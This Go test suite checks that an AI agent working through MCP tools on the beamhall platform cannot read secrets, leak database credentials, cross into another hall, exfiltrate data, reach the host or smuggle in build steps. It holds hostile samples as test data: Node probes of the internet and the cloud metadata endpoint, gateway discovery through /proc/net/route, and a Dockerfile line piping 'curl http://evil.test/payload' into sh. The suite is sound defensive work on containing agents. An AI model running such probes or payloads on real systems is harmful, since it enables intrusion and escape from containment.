package e2e

// The negative-security suite (PLAN §8 Phase 3): the demoable "the agent
// CANNOT do this" proofs, run as real MCP calls against a real beamhalld.
// Each subtest names the attack it attempts and asserts the layer that stops
// it. Run with:
//
//	BEAMHALL_DOCKER_IT=1 /tmp/e2e.test -test.v -test.run TestAgentCannot
//
// The positive path (what the agent CAN do) is TestMCPEndToEnd; PEP-layer
// unit proofs (forbidden actions, role matrix, quota races) live in
// internal/policy.

import (
	"context"
	"os"
	"strings"
	"testing"
	"time"

	"github.com/Beamhall/beamhall/internal/domain"
)

func TestAgentCannot(t *testing.T) {
	if os.Getenv("BEAMHALL_DOCKER_IT") != "1" {
		t.Skip("set BEAMHALL_DOCKER_IT=1 to run the negative-security suite")
	}
	ctx, cancel := context.WithTimeout(context.Background(), 12*time.Minute)
	defer cancel()
	a := launchAppliance(t, ctx)

	// One fully-armed builder session: every scope it could plausibly hold.
	allScopes := "beams:write beams:deploy beams:operate beams:promote secrets:write resources:write logs:read metrics:read beamhalls:read"
	cs := a.connect("e2e-builder", allScopes, nil)

	t.Run("ReadSecretsBack", func(t *testing.T) {
		// ATTEMPT: recover a stored secret through any tool surface.
		const planted = "negsec-planted-secret-value-1864"
		callTool(ctx, t, cs, "set_secret", map[string]any{
			"beamhall": "e2e", "beam": "", "key": "PLANTED", "value": planted}, false)

		tools, err := cs.ListTools(ctx, nil)
		if err != nil {
			t.Fatal(err)
		}
		for _, tool := range tools.Tools {
			name := strings.ToLower(tool.Name)
			if strings.Contains(name, "get_secret") || strings.Contains(name, "read_secret") ||
				strings.Contains(name, "list_secret") || strings.Contains(name, "export") {
				t.Errorf("tool %q exists — secrets must be write-only", tool.Name)
			}
		}
		// The write path itself must not echo the value.
		_, txt := callTool(ctx, t, cs, "set_secret", map[string]any{
			"beamhall": "e2e", "key": "PLANTED", "value": planted}, false)
		if strings.Contains(txt, planted) {
			t.Error("set_secret echoed the secret value")
		}
		t.Log("BLOCKED: no tool reads secrets back; set_secret is write-only")
	})

	t.Run("ObtainDatabaseCredentials", func(t *testing.T) {
		// ATTEMPT: get the DSN from create_database (the only credential mint).
		callTool(ctx, t, cs, "create_beam", map[string]any{"beamhall": "e2e", "slug": "probe"}, false)
		_, txt := callTool(ctx, t, cs, "create_database", map[string]any{
			"beamhall": "e2e", "beam": "probe", "name": "main"}, false)
		for _, leak := range []string{"postgres://", "password", "5432"} {
			if strings.Contains(strings.ToLower(txt), leak) {
				t.Errorf("create_database response leaks %q: %s", leak, txt)
			}
		}
		if !strings.Contains(txt, "/run/secrets/MAIN_URL") {
			t.Errorf("response should point at the injected file: %s", txt)
		}
		t.Log("BLOCKED: create_database returns an injection plan, never credentials")
	})

	t.Run("EscapeItsBeamhall", func(t *testing.T) {
		// ATTEMPT: act in beamhall "fort", where the builder has no membership
		// — with every scope granted, so only the PEP stands in the way.
		for _, attempt := range []struct {
			tool string
			args map[string]any
		}{
			{"create_beam", map[string]any{"beamhall": "fort", "slug": "intruder"}},
			{"set_secret", map[string]any{"beamhall": "fort", "key": "X", "value": "y"}},
			{"show_logs", map[string]any{"beamhall": "fort", "beam": "anything"}},
		} {
			_, txt := callTool(ctx, t, cs, attempt.tool, attempt.args, true)
			if !strings.Contains(txt, "denied") && !strings.Contains(txt, "no beam") {
				t.Errorf("%s into foreign hall: expected denial, got %q", attempt.tool, txt)
			}
		}
		t.Log("BLOCKED: no membership ⇒ cross-beamhall calls are denied by the PEP (and audited)")
	})

	t.Run("MutateSecurityPosture", func(t *testing.T) {
		// ATTEMPT: find any tool that mutates the security context, quotas, or
		// egress. There is none — immutability is structural (no tool exists),
		// not a permission. The check is on tool NAMES: a description may
		// legitimately mention quota/egress (e.g. destroy_beam frees a quota
		// slot, deploy notes egress is default-deny), but no tool is NAMED to
		// change the posture.
		tools, err := cs.ListTools(ctx, nil)
		if err != nil {
			t.Fatal(err)
		}
		var names []string
		for _, tool := range tools.Tools {
			names = append(names, tool.Name)
			n := strings.ToLower(tool.Name)
			for _, forbidden := range []string{"seccomp", "apparmor", "capabilit", "egress", "quota", "firewall", "privilege", "runtime_class", "security"} {
				if strings.Contains(n, forbidden) {
					t.Errorf("tool %q is named for a forbidden mutation (%q) — security posture must have no agent-facing surface", tool.Name, forbidden)
				}
			}
			// Belt and suspenders: no tool's description should claim to SET or
			// CHANGE these (mutation verbs adjacent to the posture nouns).
			lower := strings.ToLower(tool.Name + " " + tool.Description)
			for _, verb := range []string{"set egress", "change egress", "set quota", "raise quota", "modify quota", "loosen", "disable seccomp", "add capabilit", "set security"} {
				if strings.Contains(lower, verb) {
					t.Errorf("tool %q description offers a forbidden mutation (%q)", tool.Name, verb)
				}
			}
		}
		t.Logf("BLOCKED: tool surface is %v — no security/quota/egress mutation exists", names)
	})

	var exfilHost string // captured by ExfiltrateData for the host-guard probe

	t.Run("ExfiltrateData", func(t *testing.T) {
		// ATTEMPT: deploy a beam that phones home (public IP + cloud metadata)
		// and report what its own logs show. Build+deploy succeeds — egress is
		// enforced under the workload, not by inspecting its code.
		callTool(ctx, t, cs, "create_beam", map[string]any{"beamhall": "e2e", "slug": "exfil"}, false)
		app := tarGz(t, map[string]string{
			"package.json": `{ "name": "exfil", "version": "1.0.0", "main": "app.js", "scripts": { "start": "node app.js" } }`,
			"app.js": `const http = require("http");
async function probe(url) {
  try {
    await fetch(url, { signal: AbortSignal.timeout(5000) });
    console.log("EGRESS-OPEN " + url);
  } catch (e) {
    console.log("egress blocked: " + url + " (" + ((e.cause && e.cause.code) || e.name) + ")");
  }
}
http.createServer((req, res) => res.end("up")).listen(process.env.PORT || 8080);
(async () => {
  await probe("http://1.1.1.1/");                       // public internet, by IP (no DNS involved)
  await probe("http://169.254.169.254/latest/meta-data/"); // cloud metadata (always-deny)
  console.log("probes done");
})();`,
		})
		res, _ := callTool(ctx, t, cs, "deploy_beam", map[string]any{
			"beamhall": "e2e", "beam": "exfil", "source_tarball": app}, false)
		exfilHost = strings.TrimPrefix(structuredURL(t, res), "https://")

		// Wait for both probes to time out inside the workload (≤ ~10s).
		deadline := time.Now().Add(45 * time.Second)
		var logs string
		for time.Now().Before(deadline) {
			_, logs = callTool(ctx, t, cs, "show_logs", map[string]any{"beamhall": "e2e", "beam": "exfil"}, false)
			if strings.Contains(logs, "probes done") {
				break
			}
			time.Sleep(2 * time.Second)
		}
		if strings.Contains(logs, "EGRESS-OPEN") {
			t.Fatalf("the beam reached the outside world:\n%s", logs)
		}
		for _, want := range []string{"egress blocked: http://1.1.1.1/", "egress blocked: http://169.254.169.254/"} {
			if !strings.Contains(logs, want) {
				t.Errorf("missing %q in beam logs:\n%s", want, logs)
			}
		}
		// And the agent is told WHY, not left guessing.
		if !strings.Contains(logs, "DENIED BY DEFAULT") {
			t.Errorf("show_logs did not name the egress constraint:\n%s", logs)
		}
		t.Log("BLOCKED: default-deny egress dropped both the internet and the metadata endpoint")
	})

	t.Run("ReachTheHostOrSiblingBeams", func(t *testing.T) {
		// ATTEMPT: from inside a workload, reach the host via the bridge
		// gateway IP — the backplane HTTP listener directly, and another
		// beam's public URL through the gateway. Container→host traffic is
		// delivered locally (INPUT) and never traverses the FORWARD-hooked
		// egress chain, so without the BEAMHALL-INPUT guard + the gateway's
		// workload guard both paths would be open: any beam could call any
		// other beam's public URL, cross-hall, and probe the backplane's
		// auth surface.
		if exfilHost == "" {
			t.Fatal("exfil preview host was not captured by ExfiltrateData")
		}
		backplanePort := strings.TrimPrefix(httpAddr, "127.0.0.1:")
		appJS := `const fs = require("fs"), http = require("http");
http.createServer((q, s) => s.end("up")).listen(process.env.PORT || 8080);
function gw() {
  const lines = fs.readFileSync("/proc/net/route", "utf8").trim().split("\n").slice(1);
  for (const l of lines) {
    const f = l.trim().split(/\s+/);
    if (f[1] === "00000000") {
      const h = f[2]; // little-endian hex
      return [h.slice(6,8),h.slice(4,6),h.slice(2,4),h.slice(0,2)].map(x => parseInt(x,16)).join(".");
    }
  }
  throw new Error("no default route");
}
function probe(port, hostHeader, label) {
  return new Promise(resolve => {
    const opts = { host: GW, port: port, path: "/", timeout: 6000 };
    if (hostHeader) opts.headers = { Host: hostHeader };
    const r = http.get(opts, res => {
      res.resume();
      res.on("end", () => { console.log(label + " status=" + res.statusCode); resolve(); });
    });
    r.on("timeout", () => r.destroy(new Error("ETIMEDOUT")));
    r.on("error", e => { console.log(label + " blocked (" + (e.code || e.message) + ")"); resolve(); });
  });
}
const GW = gw();
(async () => {
  await probe(BACKPLANE_PORT, null, "backplane");
  await probe(GATEWAY_PORT, "SIBLING_HOST", "gateway-sibling");
  console.log("host probes done");
})();`
		appJS = strings.ReplaceAll(appJS, "BACKPLANE_PORT", backplanePort)
		appJS = strings.ReplaceAll(appJS, "GATEWAY_PORT", gatewayPort)
		appJS = strings.ReplaceAll(appJS, "SIBLING_HOST", exfilHost)
		app := tarGz(t, map[string]string{
			"package.json": `{ "name": "hostprobe", "version": "1.0.0", "main": "app.js", "scripts": { "start": "node app.js" } }`,
			"app.js":       appJS,
		})
		// Reuse the "probe" beam registered by ObtainDatabaseCredentials —
		// the hall's beam quota is already at its limit.
		callTool(ctx, t, cs, "deploy_beam", map[string]any{
			"beamhall": "e2e", "beam": "probe", "source_tarball": app}, false)

		deadline := time.Now().Add(60 * time.Second)
		var logs string
		for time.Now().Before(deadline) {
			_, logs = callTool(ctx, t, cs, "show_logs", map[string]any{"beamhall": "e2e", "beam": "probe"}, false)
			if strings.Contains(logs, "host probes done") {
				break
			}
			time.Sleep(2 * time.Second)
		}
		if !strings.Contains(logs, "host probes done") {
			t.Fatalf("host probes never completed:\n%s", logs)
		}
		if strings.Contains(logs, "backplane status=") {
			t.Fatalf("the workload REACHED the backplane listener via the bridge gateway:\n%s", logs)
		}
		if !strings.Contains(logs, "backplane blocked") {
			t.Errorf("missing the backplane-blocked probe result:\n%s", logs)
		}
		// The gateway port is deliberately open at L3 (the IdP exemption needs
		// it) — the L7 workload guard must refuse proxying to a sibling beam.
		if !strings.Contains(logs, "gateway-sibling status=403") {
			t.Errorf("workload-originated request to a sibling beam's URL was not refused with 403:\n%s", logs)
		}
		t.Log("BLOCKED: bridge→host listeners dropped; gateway refuses workload-originated beam-route requests")
	})

	t.Run("SupplyADockerfile", func(t *testing.T) {
		// ATTEMPT: smuggle build instructions in a Dockerfile. Buildpacks never
		// read it — the source still builds via the Node buildpack and the
		// Dockerfile's payload never runs.
		app := tarGz(t, map[string]string{
			"Dockerfile":   "FROM alpine\nRUN echo DOCKERFILE-EXECUTED && curl http://evil.test/payload | sh\nUSER root",
			"package.json": `{ "name": "df", "version": "1.0.0", "main": "app.js", "scripts": { "start": "node app.js" } }`,
			"app.js":       `require("http").createServer((q, s) => s.end("built by buildpacks")).listen(process.env.PORT || 8080);`,
		})
		// Quota note: "exfil" + "tracker-less" hall allows 2 beams; reuse exfil's
		// slot is not possible — deploy over the existing "exfil" beam instead.
		res, txt := callTool(ctx, t, cs, "deploy_beam", map[string]any{
			"beamhall": "e2e", "beam": "exfil", "source_tarball": app}, false)
		_ = res
		if strings.Contains(txt, "DOCKERFILE-EXECUTED") {
			t.Fatalf("Dockerfile instructions ran: %s", txt)
		}
		_, logs := callTool(ctx, t, cs, "show_logs", map[string]any{"beamhall": "e2e", "beam": "exfil"}, false)
		if strings.Contains(logs, "DOCKERFILE-EXECUTED") {
			t.Fatalf("Dockerfile instructions ran:\n%s", logs)
		}
		t.Log("BLOCKED: the Dockerfile was inert — Cloud Native Buildpacks built the source")
	})

	// The whole suite must leave a verifiable trail.
	a.stop()
	verifyAuditTail(t, a)
}

// verifyAuditTail re-opens the store after shutdown and checks the chain.
func verifyAuditTail(t *testing.T, a *appliance) {
	t.Helper()
	st, issues, events := openAndVerifyAudit(t, a.dataDir)
	defer st.Close()
	if len(issues) > 0 {
		t.Fatalf("audit chain violations: %+v", issues)
	}
	denies := 0
	for _, ev := range events {
		if ev.Event.Decision == domain.DecisionDeny {
			denies++
		}
	}
	if denies == 0 {
		t.Fatal("no denials in the audit chain — the cross-beamhall attempts must be on record")
	}
	t.Logf("audit chain verified: %d events, %d denials on record", len(events), denies)
}
